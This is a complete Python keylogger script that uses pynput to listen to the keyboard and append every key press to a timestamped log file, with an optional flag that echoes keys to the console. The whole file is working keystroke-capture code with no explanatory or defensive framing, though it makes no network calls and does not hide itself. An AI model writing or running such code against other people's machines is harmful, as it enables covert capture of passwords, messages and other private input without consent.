from pynput import keyboard
from datetime import datetime
import argparse

class KeyLogger():
    def __init__(self, args, filename: str = "keylogs.txt") -> None:
        self.args = args

        # save to different file every time
        now = datetime.now()
        dt_string = now.strftime("%Y_%m_%d_%H_%M_%S")
        filename = "keylogs_" + dt_string + ".txt"
        print(filename)
        self.filename = filename

    @staticmethod
    def get_char(key):
        try:
            return key.char
        except Exception as ex:
            #return "An exception occurred"
            template = "An exception of type {0} occurred. Arguments:\n{1!r}"
            message = template.format(type(ex).__name__, ex.args)
            #print(message)

        try:
            return key.name
        except AttributeError:
            return str(key)
        except Exception as ex:
            template = "An exception of type {0} occurred. Arguments:\n{1!r}"
            message = template.format(type(ex).__name__, ex.args)
            # print(message)
            return "An exception occurred"

    def on_press(self, key):
        if self.args.printout:
            print(key)

        try:
            with open(self.filename, 'a') as logs:
                logs.write(self.get_char(key) + "\n")
                #logs.write(self.get_char(key))
        except:
            if self.args.printout:
                print("An exception occurred")

    def main(self):
        listener = keyboard.Listener(
            on_press=self.on_press,
        )
        listener.start()


if __name__ == '__main__':

    parser = argparse.ArgumentParser()
    parser.add_argument('--printout', type=bool, default=False, help='')
    args = parser.parse_args()

    logger = KeyLogger(args=args)
    logger.main()
    input()

    exit(0)
